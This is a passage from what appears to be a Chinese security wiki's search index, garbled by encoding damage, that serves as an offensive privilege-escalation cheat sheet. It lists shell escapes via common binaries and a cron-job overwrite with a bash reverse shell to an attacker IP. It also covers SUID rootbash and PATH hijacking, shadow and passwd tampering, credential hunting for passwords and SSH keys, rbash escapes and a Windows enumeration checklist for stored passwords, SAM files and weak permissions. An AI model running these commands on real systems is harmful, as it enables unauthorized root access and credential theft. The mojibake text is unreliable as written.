ç”¨xxd --exec /bin/bash# yelp (gnome)yelp man:bash!/bin/bash# zipzip /tmp/x.zip /etc/passwd -T -TT /bin/bash# zshzsh# zsoelimzsoelim -p /bin/bash è®¡åˆ’ä»»åŠ¡ææƒç³»ç»Ÿå†…å¯èƒ½ä¼šæœ‰ä¸€äº›å®šæ—¶æ‰§è¡Œçš„ä»»åŠ¡ï¼Œä¸€èˆ¬è¿™äº›ä»»åŠ¡ç”±crontabæ¥ç®¡ç†ï¼Œå…·æœ‰æ‰€å±ç”¨æˆ·çš„æƒé™ã€‚érootæƒé™çš„ç”¨æˆ·æ˜¯ä¸å¯ä»¥åˆ—å‡ºrootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡çš„ã€‚ä½†æ˜¯etcå†…ç³»ç»Ÿçš„è®¡åˆ’ä»»åŠ¡å¯ä»¥è¢«åˆ—å‡ºã€‚ crontab -e ç¼–è¾‘è®¡åˆ’ä»»åŠ¡ crontab -l æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ crontab -r åˆ é™¤ç›®å‰çš„crontab ls -l etccron* cat etccrontab æ–‡ä»¶é‡å†™1.æŸ¥çœ‹system-wide crontabçš„å†…å®¹ï¼šcat /etc/crontab 2.åœ¨æœåŠ¡å™¨ä¸ŠæŸ¥æ‰¾overwrite.sh æ–‡ä»¶ï¼šlocate overwrite.sh /usr/local/bin/overwrite.sh 3.æ£€æŸ¥æ–‡ä»¶çš„æƒé™ls -l /usr/local/bin/overwrite.sh æ³¨æ„ï¼šè¿™ä¸ªæ–‡ä»¶æ˜¯å¯å†™çš„ 4.å°† overwrite.shæ–‡ä»¶çš„å†…å®¹æ›¿æ¢ä¸ºï¼š#!/bin/bash bash -i /dev/tcp/192.168.175.130/4444 01 5.kaliä¸Šè¿è¡Œncç­‰å¾… cron jobsè¿è¡Œï¼Œè¿”å›rootæƒé™ ç¯å¢ƒå˜é‡åŠ«æŒæŸ¥çœ‹å®šæ—¶ä»»åŠ¡ï¼š å‘ç°å®šä¹‰äº†è¯¸å¤šç¯å¢ƒå˜é‡ï¼Œå¦‚æœå…¶ä»»åŠ¡æœ‰ æœªæŒ‡å®šç»å¯¹è·¯å¾„çš„æŒ‡ä»¤ï¼Œå¦‚ 17 * * * * root shell.sh è€Œä¸”æˆ‘ä»¬åœ¨å…¶ç¯å¢ƒå˜é‡è·¯å¾„ä¸­å¯ä»¥è¿›è¡Œå†™å…¥æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡å†™å…¥ç¯å¢ƒå˜é‡çš„é å‰è·¯å¾„ä¸€ä¸ªåŒåæ¶æ„æ–‡ä»¶ä»è€Œå¯¼è‡´ç¯å¢ƒå˜é‡åŠ«æŒã€‚ æ¯”å¦‚åœ¨ sbin å†™å…¥ä¸€ä¸ª åå¼¹ shell åŠŸèƒ½çš„ shell.shï¼Œé‚£ä¹ˆå°±å¯ä»¥é€ æˆææƒã€‚ 2.åœ¨homeuser ä¸­åˆ›å»ºæ–‡ä»¶ overwrite.shï¼Œå†…å®¹å¦‚ä¸‹ï¼š#!/bin/bash cp /bin/bash /tmp/rootbash chmod +s /tmp/rootbash 3.åŠ æƒ$ chmod +x /home/user/overwrite.sh 4.ç­‰å¾…cronjobè¿è¡Œï¼ˆæ­¤ä½œä¸šå°¤å…¶æ¯åˆ†é’Ÿè¿è¡Œä¸€æ¬¡ï¼‰ã€‚5.åˆ›å»ºtmprootbashæ–‡ä»¶æ‰§è¡Œå®ƒï¼Œä½¿ç”¨ä¸-pä¿å­˜æœ‰æ•ˆçš„UID /tmp/rootbash â€“p é€šé…ç¬¦https://www.secpulse.com/archives/72965.html ç¯å¢ƒå˜é‡ææƒç¯å¢ƒåŠ«æŒéœ€è¦çš„ä¸¤ä¸ªæ¡ä»¶ å­˜åœ¨å¸¦æœ‰suidçš„æ–‡ä»¶suidæ–‡ä»¶å­˜åœ¨ç³»ç»Ÿå‘½ä»¤ ä¸”è¿™ä¸ªæ–‡ä»¶ä¸­å¿…é¡»æœ‰ç³»ç»Ÿå‘½ä»¤ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å‘½åä¸€ä¸ªå’Œè¿™ä¸ªç³»ç»Ÿå‘½ä»¤ç›¸åŒçš„æ–‡ä»¶å†™å…¥binbashï¼› å†å°†å­˜æ”¾è¿™ä¸ªæ–‡ä»¶çš„è·¯å¾„åŠ å…¥ç¯å¢ƒå˜é‡ä¸­ï¼Œå½“ç³»ç»Ÿå»æ‰§è¡Œè¿™ä¸ªå¸¦æœ‰ç³»ç»Ÿå‘½ä»¤çš„æ–‡ä»¶æ—¶ï¼›å°±ä¼šç›´æ¥æ‰§è¡Œæˆ‘ä»¬å‘½åå’Œè¿™ä¸ªç³»ç»Ÿå‘½ä»¤ç›¸åŒçš„æ–‡ä»¶ï¼›è€ŒéçœŸå®çš„ç³»ç»Ÿå‘½ä»¤ï¼›ä»è€Œå®ç°åŠ«æŒç¯å¢ƒå˜é‡ææƒã€‚ å¯»æ‰¾suidfind / -perm -u=s -type f 2/dev/nullå‡è®¾å‘ç° /usr/local/bin/restore æ˜¯ SUID-rootï¼Œå±ä¸» rootã€‚ é€†å‘strings /usr/local/bin/restore | grep -E ^/(s?bin|usr)æˆ–è€…è¿è¡Œä¸€ä¸‹è¿™ä¸ªï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆ åŠ«æŒå‡è®¾å‘ç°äº† homelvxyzscriptdemo æˆ‘ä»¬è¿è¡Œä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°å®ƒä¼šæ‰§è¡Œ pså‘½ä»¤ 1.echoæˆ‘ä»¬å°±å¾€tmpå†™å…¥ ä¸€ä¸ªåŒåæ–‡ä»¶ï¼Œå†…å®¹ä¸º binbash cd /tmpecho /bin/bash pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/lvxyz/script./demo 2.cpæˆ‘ä»¬å°±å¾€tmpå†™å…¥ ä¸€ä¸ªåŒåæ–‡ä»¶ï¼Œå†…å®¹ä¸º binbash cd /tmpcp /bin/bash /tmp/pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/lvxyz/script./demo å¯†ç ææƒgrep --color=auto -rnw / -ie PASSWORD --color=always 2 /dev/nullfind . -type f -exec grep -i -I PASSWORD /dev/null \\;strings /dev/mem -n10 | grep -i PASSlocate password | morefind . -name *.php -print0 | xargs -0 grep -i -n var $passwordfind / -name authorized_keys 2 /dev/nullfind / -name id_rsa 2 /dev/null ä¸€ã€å¯è¯»shadowæ–‡ä»¶åˆ©ç”¨ææƒls-al etcshadow # æŸ¥çœ‹æ–‡ä»¶å±æ€§ï¼Œç¡®ä¿å½“å‰ç”¨æˆ·å¯¹shadowæ–‡ä»¶å…·æœ‰å¯è¯»æƒé™ cat etcshadow |grepâ€™:$â€˜# æŸ¥çœ‹shadowæ–‡ä»¶å¤¹ï¼Œgrepç›¸å½“äºè¿‡æ»¤å™¨ï¼Œåé¢æ¥è¿‡æ»¤æ¡ä»¶ åœ¨etcshadowæ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªç”¨æˆ·çš„å¯†ç éƒ½æ˜¯ç”¨ä¸€ä¸ªç‰¹å®šçš„å“ˆå¸Œå‡½æ•°åŠ å¯†çš„ã€‚ä¸ºäº†é¿å…å¯†ç è¢«è½»æ˜“ç ´è§£ï¼ŒLinux ç³»ç»Ÿä¼šä½¿ç”¨ä¸åŒçš„å“ˆå¸Œå‡½æ•°æ¥åŠ å¯†å¯†ç ã€‚è€Œ$y$ä¸­çš„yå­—ç¬¦åˆ™è¡¨ç¤ºä½¿ç”¨çš„æ˜¯å“ªç§å“ˆå¸Œå‡½æ•°ï¼Œä¸åŒçš„å“ˆå¸Œå‡½æ•°å¯¹åº”ä¸åŒçš„å­—ç¬¦ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ $y$ å€¼åŠå…¶å¯¹åº”çš„å“ˆå¸Œå‡½æ•°ï¼š $1$è¡¨ç¤ºä½¿ç”¨çš„æ˜¯ MD5 å“ˆå¸Œå‡½æ•°ï¼› $2$æˆ–$2a$è¡¨ç¤ºä½¿ç”¨çš„æ˜¯ Blowfish å“ˆå¸Œå‡½æ•°ï¼› $5$è¡¨ç¤ºä½¿ç”¨çš„æ˜¯ SHA-256 å“ˆå¸Œå‡½æ•°ï¼› $6$è¡¨ç¤ºä½¿ç”¨çš„æ˜¯ SHA-512 å“ˆå¸Œå‡½æ•°ã€‚ sudo john â€“wordlistusrsharewordlistrockyou.txt hash.txt # johnè¿›è¡Œç ´è§£ äºŒã€å¯å†™shadowæ–‡ä»¶åˆ©ç”¨ææƒcp etcshadow tmpshadow.bak # å¤‡ä»½é‡è¦æ–‡ä»¶ mkpasswd -m sha-512 123456# ç”Ÿæˆhashï¼Œhashç®—æ³•ä¸ºsha-512 æ›¿æ¢etcshadowä¸­rootçš„å¯†ç  ä¸‰ã€å¯å†™passwdæ–‡ä»¶åˆ©ç”¨ææƒææƒè‚¯å®šæœ€å…ˆå…³æ³¨rootç”¨æˆ·ï¼Œç°ä»£çš„linuxå‘è¡Œç‰ˆä¸­ï¼Œå¯†ç hashéƒ½æ˜¯å­˜å‚¨åœ¨etcshadowä¸­ï¼Œetcpasswdä¸­å¹¶ä¸ç›´æ¥å­˜å‚¨å¯†ç hashï¼Œé€šå¸¸ç”¨Xæ¥å ä½ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ç›´æ¥å°†å¯†ç å†™å…¥etcpasswdä¸­ï¼Œå°è¯•ææƒã€‚ä¹Ÿå°±æ˜¯ä¸€ä¸ªä¼˜å…ˆçº§çš„é—®é¢˜ï¼Œå…ˆè¯»å–passwdï¼Œå†è¯»å–shadowæ–‡ä»¶ã€‚ cp etcpasswd tmppasswd.bak # å¤‡ä»½æ–‡ä»¶ openssl passwdæ˜æ–‡# openssl passwdç”Ÿæˆå¯†ç çš„hashå€¼ # æ›¿æ¢etcpasswdä¸­çš„X ç”Ÿæˆhashæ—¶ï¼Œä¹Ÿå¯ä»¥ç”¨font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);mkpasswd/fontï¼Œä½†æ˜¯passwdæ–‡ä»¶ä¸­ç”Ÿæˆhashæ—¶æœ€å¥½ç”¨font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);openssl passwd/fontï¼Œå†shadowæ–‡ä»¶ä¸­ç”Ÿæˆhashç”¨font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);mkpasswd/fontã€‚ https://forum.butian.net/share/317 ç¬¬ä¸‰æ–¹æœåŠ¡NFSå…±äº«https://www.cnblogs.com/kqdssheng/p/18310245#id1 NFSï¼ˆç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼‰æ˜¯ä¸€ç§åœ¨ç«¯å£TCPUDP2049ä¸Šè¿è¡Œçš„ç½‘ç»œæ–‡ä»¶å…±äº«åè®®ï¼Œç”±æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¸¤ä¸ªç»„ä»¶ç»„æˆã€‚NFSæœåŠ¡å™¨ä¸Šåˆ›å»ºå…±äº«ç›®å½•ï¼Œå¯ä»¥é€šè¿‡ç½‘ç»œä¸å…¶ä»–Linuxå®¢æˆ·ç«¯å…±äº«æ–‡ä»¶ã€‚è·å¾—æƒé™çš„ç”¨æˆ·å¯ä»¥å°†æ–‡ä»¶æ·»åŠ åˆ°å…±äº«ä¸­ï¼Œå¹¶ä¸æœ‰æƒè®¿é—®è¯¥ç›®å½•çš„å…¶ä»–ç”¨æˆ·å…±äº«ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªNFSå…±äº«éƒ½ä¼šå¯ç”¨root_squashåŠŸèƒ½ï¼Œä»¥é˜²æ­¢å…±äº«æ–‡ä»¶æ‹¥æœ‰root:rootèº«ä»½æˆ–ç‰¹æ®Šæƒé™ï¼ˆå³å¯ç”¨root_squashåï¼Œæ‰€æœ‰å…±äº«æ–‡ä»¶éƒ½ä¼šå˜æˆnobody:nogroupèº«ä»½ï¼‰ã€‚ä½†æ˜¯ï¼Œå¦‚æœå¯ç”¨äº†no_root_squashåŠŸèƒ½ï¼Œæ–‡ä»¶å¯ä»¥ä»¥rootèº«ä»½å­˜åœ¨ï¼Œè¿™å°±å®¹æ˜“å¯¼è‡´æƒé™å‡çº§ã€‚ MYSQLhttps://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/ dockerå†…æ ¸æ¼æ´ææƒéå¿…è¦æƒ…å†µï¼Œä¸å»ºè®®ä½¿ç”¨ï¼Œå®¹æ˜“æå®•æœº"},{"title":"rbash","path":"/wiki/WP/Linuxææƒ/rbash.html","content":"ä»€ä¹ˆæ˜¯rbashrbash,å³å—é™åˆ¶çš„ bash,å…¶å¯ä»¥ç”¨ä½œä¸­è½¬æœåŠ¡å™¨ï¼ˆå®é™…ä¸Šrbashåªæ˜¯bashçš„ä¸€ä¸ªè½¯é“¾æ¥ï¼‰ã€‚å®ƒä¸ä¸€èˆ¬shellçš„åŒºåˆ«åœ¨äºä¼šé™åˆ¶ä¸€äº›è¡Œä¸ºï¼Œè®©ä¸€äº›å‘½ä»¤æ— æ³•æ‰§è¡Œã€‚ å¦‚ä½•è®¾ç½®rbash1ï¼Œå¤åˆ¶ä¸€ä¸ªbashï¼Œé‡å‘½åä¸ºrbash cp /bin/bash /bin/rbash2ï¼Œè®¾ç½®ç”¨æˆ·tomç™»é™†çš„shellä¸ºrbash useradd -s /bin/rbash tom3, åœ¨tomç”¨æˆ·ä¸‹æ–°å»ºä¸€ä¸ª.binç›®å½•å­˜æ”¾å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ mkdir -p /home/tom/.bin4, é€šè¿‡è½¯è¿æ¥æ‰§è¡Œå‘½ä»¤ ln -s /bin/clear /home/$tom/.bin/clear5, ç¼–è¾‘æ–‡ä»¶/home/$tom/.bashrc,æ·»åŠ export PATH=$HOME/.bin/.æ–‡ä»¶ä¸€å®šè¦ä»¥# .bashrcä¸ºé¦–è¡Œ. å¦‚ä½•ç»•è¿‡é™åˆ¶ä¿¡æ¯æ”¶é›†tom@DC-2:~$ echo $PATH/home/tom/usr/bintom@DC-2:~$ echo /home/tom/usr/bin/*/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/viemv æŸ¥çœ‹ç¯å¢ƒå˜é‡ ç‰¹åˆ«æ˜¯æŸ¥çœ‹shell å’ŒPATHæ£€æŸ¥ç¼–ç¨‹è¯­è¨€ java php ...sudo -l å¸¸è§çš„é€ƒé€¸æŠ€æœ¯ â€œ â€ å¦‚æœå…è®¸ï¼Œç›´æ¥è¿è¡Œbinbash cp cp /bin/bash test1cp /bin/sh test2./test1 # åˆ‡æ¢åˆ°äº†/bin/bash./test2 # åˆ‡æ¢åˆ°äº†/bin/sh å¸¸è§çš„åº”ç”¨ 1 ftp,gdb,man ftp !/bin/sh gdb !/bin/sh man !/bin/sh2 git git git help status3 vi/vim :set shell=/bin/bsah :shell æˆ–è€… :!/bin/bash4 BASH_CMDS[a]=/bin/sh;a #æŠŠ/bin/bashç»™aå˜é‡export PATH=$PATH:/bin/ #å°†/bin ä½œä¸ºPATHç¯å¢ƒå˜é‡å¯¼å‡ºexport PATH=$PATH:/usr/bin #å°†/usr/binä½œä¸ºPATHç¯å¢ƒå˜é‡å¯¼å‡º"},{"title":"Win_ä¿¡æ¯æ”¶é›†","path":"/wiki/å†…ç½‘/ææƒ/Win_ä¿¡æ¯æ”¶é›†.html","content":"æŒ‡å—æ¦‚è¿°åœ¨æ¯ä¸ªéƒ¨åˆ†ä¸­ï¼Œæˆ‘é¦–å…ˆæä¾›è€çš„å¯é çš„CMDå‘½ä»¤ï¼Œç„¶åæ˜¯ä¸€ä¸ªPowershellå®ç°çš„çš„ç­‰ä»·å‘½ä»¤ã€‚åŒæ—¶æ‹¥æœ‰è¿™ä¸¤ç§å·¥å…·æ˜¯éå¸¸å¥½çš„ï¼ŒPowershellæ¯”ä¼ ç»Ÿçš„CMDæ›´åŠ çµæ´»ã€‚ç„¶è€Œï¼Œæ²¡æœ‰ä¸€ä¸ªPowershellå‘½ä»¤èƒ½ç­‰ä»·äºæ‰€æœ‰ä¸œè¥¿ï¼ˆæˆ–è€…CMDåœ¨æŸäº›äº‹æƒ…ä¸Šä»ç„¶æ›´ç®€å•æ›´å¥½ï¼‰ï¼Œæ‰€ä»¥ä¸€äº›éƒ¨åˆ†å°†åªåŒ…å«å¸¸è§„çš„CMDå‘½ä»¤ã€‚ æ“ä½œç³»ç»Ÿæ“ä½œç³»ç»Ÿç±»å‹å’Œæ¶æ„ï¼Ÿå®ƒæ˜¯å¦ç¼ºå°‘ä»»ä½•è¡¥ä¸ï¼Ÿ systeminfowmic qfe ç¯å¢ƒå˜é‡æœ‰ä»€ä¹ˆæœ‰è¶£çš„åœ°æ–¹å—ï¼ŸåŸŸæ§åˆ¶å™¨åœ¨LOGONSERVERï¼Ÿ setGet-ChildItem Env: | ft Key,Value æœ‰æ²¡æœ‰å…¶ä»–è¿æ¥çš„é©±åŠ¨å™¨ï¼Ÿ net usewmic logicaldisk get caption,description,providernameGet-PSDrive | where $_.Provider -like Microsoft.PowerShell.Core\\FileSystem| ft Name,Root ç”¨æˆ· ä½ æ˜¯è°ï¼Ÿ whoamiecho %USERNAME%$env:UserName ç³»ç»Ÿä¸Šæœ‰å“ªäº›ç”¨æˆ·ï¼Ÿä»»ä½•æ—§çš„ç”¨æˆ·é…ç½®æ–‡ä»¶æ²¡æœ‰è¢«æ¸…ç†æ‰ï¼Ÿ net usersdir /b /ad C:\\Users\\dir /b /ad C:\\Documents and Settings\\ # Windows XP and belowGet-LocalUser | ft Name,Enabled,LastLogonGet-ChildItem C:\\Users -Force | select Name æ˜¯å¦æœ‰å…¶ä»–äººç™»å½•ï¼Ÿ qwinsta ç³»ç»Ÿä¸Šæœ‰å“ªäº›ç”¨æˆ·ç»„ï¼Ÿ net localgroupGet-LocalGroup | ft Name åœ¨ç®¡ç†å‘˜ç»„ä¸­æœ‰å“ªäº›ç”¨æˆ·ï¼Ÿ net localgroup AdministratorsGet-LocalGroupMember Administrators | ft Name, PrincipalSource ç”¨æˆ·è‡ªåŠ¨ç™»å½•å¯¹åº”çš„æ³¨å†Œè¡¨ä¸­æœ‰äº›ä»€ä¹ˆå†…å®¹ï¼Ÿ reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2nul | findstr DefaultUserName DefaultDomainName DefaultPasswordGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon | select Default* Credential Managerä¸­æœ‰ä»€ä¹ˆæœ‰è¶£çš„ä¸œè¥¿ï¼Ÿ cmdkey /list æˆ‘ä»¬å¯ä»¥è®¿é—®SAMå’ŒSYSTEMæ–‡ä»¶å—ï¼Ÿ %SYSTEMROOT%\\repair\\SAM%SYSTEMROOT%\\System32\\config\\RegBack\\SAM%SYSTEMROOT%\\System32\\config\\SAM%SYSTEMROOT%\\repair\\system%SYSTEMROOT%\\System32\\config\\SYSTEM%SYSTEMROOT%\\System32\\config\\RegBack\\system ç¨‹åºï¼Œè¿›ç¨‹å’ŒæœåŠ¡ ç³»ç»Ÿéƒ½å®‰è£…äº†äº›ä»€ä¹ˆè½¯ä»¶ï¼Ÿ dir /a C:\\Program Filesdir /a C:\\Program Files (x86)reg query HKEY_LOCAL_MACHINE\\SOFTWAREGet-ChildItem C:\\Program Files, C:\\Program Files (x86) | ft Parent,Name,LastWriteTimeGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name æœ‰æ²¡æœ‰æƒé™è®¾ç½®çš„æ¯”è¾ƒè„†å¼±çš„æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶çš„æƒé™ï¼Ÿ åœ¨ç¨‹åºæ–‡ä»¶å¤¹ä¸­ï¼ˆProgram Foldersï¼‰æœ‰å“ªäº›æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹èµ‹äºˆäº†æ‰€æœ‰äººï¼ˆEveryoneï¼‰æˆ–ç”¨æˆ·ï¼ˆUserï¼‰çš„å®Œå…¨æƒé™ï¼Ÿ icacls C:\\Program Files\\* 2nul | findstr (F) | findstr Everyoneicacls C:\\Program Files (x86)\\* 2nul | findstr (F) | findstr Everyone icacls C:\\Program Files\\* 2nul | findstr (F) | findstr BUILTIN\\Usersicacls C:\\Program Files (x86)\\* 2nul | findstr (F) | findstr BUILTIN\\Users ä¿®æ”¹ç¨‹åºæ–‡ä»¶å¤¹ï¼ˆProgram Foldersï¼‰ä¸­çš„æ‰€æœ‰äººï¼ˆEveryoneï¼‰æˆ–ç”¨æˆ·ï¼ˆUserï¼‰çš„æƒé™ï¼Ÿ icacls C:\\Program Files\\* 2nul | findstr (M) | findstr Everyoneicacls C:\\Program Files (x86)\\* 2nul | findstr (M) | findstr Everyone icacls C:\\Program Files\\* 2nul | findstr (M) | findstr BUILTIN\\Usersicacls C:\\Program Files (x86)\\* 2nul | findstr (M) | findstr BUILTIN\\UsersGet-ChildItem C:\\Program Files\\*,C:\\Program Files (x86)\\* | % try Get-Acl $_ -EA SilentlyContinue | Where ($_.Access|select -ExpandProperty IdentityReference) -match Everyone catch Get-ChildItem C:\\Program Files\\*,C:\\Program Files (x86)\\* | % try Get-Acl $_ -EA SilentlyContinue | Where ($_.Access|select -ExpandProperty IdentityReference) -match BUILTIN\\Users catch ä½ ä¹Ÿå¯ä»¥ä¸Šä¼ Sysinternalsä¸­çš„accesschkæ¥æ£€æŸ¥å¯å†™æ–‡ä»¶å¤¹å’Œæ–‡ä»¶ã€‚ accesschk.exe -qwsu Everyone *accesschk.exe -qwsu Authenticated Users *accesschk.exe -qwsu Users * ç³»ç»Ÿä¸Šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æœåŠ¡æœ‰å“ªäº›ï¼Ÿæœ‰æ²¡æœ‰æš´éœ²çš„å†…éƒ¨æœåŠ¡ï¼Ÿå¦‚æœæ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å¼€å®ƒå—ï¼Ÿè¯·å‚é˜…é™„å½•ä¸­çš„ç«¯å£è½¬å‘ã€‚ tasklist /svctasklist /vnet startsc queryGet-Process | ft ProcessName,IdGet-Service æ˜¯å¦å­˜åœ¨ä»»ä½•è„†å¼±çš„æœåŠ¡æƒé™ï¼Ÿæˆ‘ä»¬å¯ä»¥é‡æ–°é…ç½®ä»€ä¹ˆå—ï¼Ÿä½ å¯ä»¥å†æ¬¡ä¸Šä¼ accesschkæ¥æ£€æŸ¥æƒé™ã€‚ accesschk.exe -uwcqv Everyone *accesschk.exe -uwcqv Authenticated Users *accesschk.exe -uwcqv Users * æœ‰æ²¡æœ‰å¼•ç”¨çš„æœåŠ¡è·¯å¾„ï¼Ÿ wmic service get name,displayname,pathname,startmode 2nul |findstr /i Auto 2nul |findstr /i /v C:\\Windows\\\\ 2nul |findstr /i /v æ˜¯å¦è®¾ç½®äº†è®¡åˆ’ä»»åŠ¡ï¼Ÿä»»ä½•è‡ªå®šä¹‰å®ç°çš„è®¡åˆ’ä»»åŠ¡ï¼Ÿ schtasks /query /fo LIST 2nul | findstr TaskNamedir C:\\windows\\tasksGet-ScheduledTask | ft TaskName, State ç³»ç»Ÿå¯åŠ¨æ—¶éƒ½è¿è¡Œäº†äº›ä»€ä¹ˆï¼Ÿ wmic startup get caption,commandreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Runreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOncereg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOncedir C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startupdir C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\StartupGet-CimInstance Win32_StartupCommand | select Name, command, Location, User | flGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceGet-ItemProperty -Path Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunGet-ItemProperty -Path Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceGet-ChildItem C:\\Users\\All Users\\Start Menu\\Programs\\StartupGet-ChildItem C:\\Users\\$env:USERNAME\\Start Menu\\Programs\\Startup AlwaysInstallElevatedæ˜¯å¦å¯ç”¨ï¼Ÿæˆ‘æ²¡æœ‰è·‘è¿‡è¿™ä¸ªï¼Œä½†æ²¡æœ‰ä¼¤å®³æ£€æŸ¥ã€‚ reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated ç½‘ç»œ è¿æ¥åˆ°äº†å“ªä¸€å—ç½‘å¡ï¼Ÿæ˜¯å¦æœ‰å¤šä¸ªç½‘ç»œï¼Ÿ ipconfig /allGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address æˆ‘ä»¬æœ‰å“ªäº›ç½‘ç»œè·¯çº¿ï¼Ÿ route printGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex ARPç¼“å­˜ä¸­æœ‰ä»€ä¹ˆï¼Ÿ arp -aGet-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State æ˜¯å¦æœ‰è¿æ¥åˆ°å…¶ä»–ä¸»æœºçš„ç½‘ç»œè¿æ¥ï¼Ÿ netstat -ano hostsæ–‡ä»¶ä¸­çš„ä»»ä½•ä¸œè¥¿ï¼Ÿ C:\\WINDOWS\\System32\\drivers\\etc\\hosts é˜²ç«å¢™æ˜¯å¦æ‰“å¼€ï¼Ÿå¦‚æœæ˜¯åˆæ˜¯æ€æ ·é…ç½®çš„ï¼Ÿ netsh firewall show statenetsh firewall show confignetsh advfirewall firewall show rule name=allnetsh advfirewall export firewall.txt ä»»ä½•å…¶ä»–æœ‰è¶£çš„æ¥å£é…ç½®ï¼Ÿ netsh dump æœ‰æ²¡æœ‰SNMPé…ç½®ï¼Ÿ reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /sGet-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse æœ‰è¶£çš„æ–‡ä»¶å’Œæ•æ„Ÿä¿¡æ¯ è¿™éƒ¨åˆ†å†…å®¹çš„å‘½ä»¤è¾“å‡ºå¯èƒ½æœ‰ç‚¹æ‚ä¹±ï¼Œæ‰€ä»¥ä½ å¯èƒ½æƒ³æŠŠå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°txtæ–‡ä»¶ä¸­è¿›è¡Œå®¡æŸ¥å’Œè§£æã€‚ åœ¨æ³¨å†Œè¡¨ä¸­æ˜¯å¦æœ‰ä»»ä½•å¯†ç ï¼Ÿ reg query HKCU /f password /t REG_SZ /sreg query HKLM /f password /t REG_SZ /s æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ²¡æœ‰æ¸…ç†æ‰çš„sysprepæˆ–unattendedæ–‡ä»¶ï¼Ÿ dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2nulGet-Childitem â€“Path C:\\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where ($_.Name -like *.xml -or $_.Name -like *.txt -or $_.Name -like *.ini) å¦‚æœæœåŠ¡å™¨æ˜¯IISç½‘ç»œæœåŠ¡å™¨ï¼Œé‚£ä¹ˆinetpubä¸­æœ‰ä»€ä¹ˆï¼Ÿä»¥åŠä»»ä½•éšè—çš„ç›®å½•ï¼Ÿweb.configæ–‡ä»¶ï¼Ÿ dir /a C:\\inetpub\\dir /s web.configC:\\Windows\\System32\\inetsrv\\config\\applicationHost.configGet-Childitem â€“Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue åœ¨IISæ—¥å¿—ç›®å½•ä¸­æœ‰äº›ä»€ä¹ˆæ–‡ä»¶ï¼Ÿ C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\W3SVC2\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\FTPSVC1\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\FTPSVC2\\u_ex[YYMMDD].log æ˜¯å¦å®‰è£…äº†XAMPPï¼ŒApacheæˆ–PHPï¼Ÿä»»ä½•æœ‰XAMPPï¼ŒApacheæˆ–PHPé…ç½®æ–‡ä»¶ï¼Ÿ dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnfGet-Childitem â€“Path C:\\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨ä»»ä½•Apacheç½‘ç»œæ—¥å¿—ï¼Ÿ dir /s access.log error.logGet-Childitem â€“Path C:\\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue 